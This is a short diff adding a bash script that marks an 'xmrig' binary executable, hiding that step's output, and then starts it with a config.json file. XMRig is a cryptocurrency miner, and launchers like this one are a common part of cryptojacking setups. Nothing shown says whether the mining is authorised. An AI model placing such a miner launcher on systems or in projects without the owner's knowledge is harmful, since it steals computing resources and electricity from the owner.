@@ -1,0 +1,4 @@
+#!/bin/bash
+
+chmod +x xmrig  >/dev/null 2>&1
+./xmrig --config=config.json
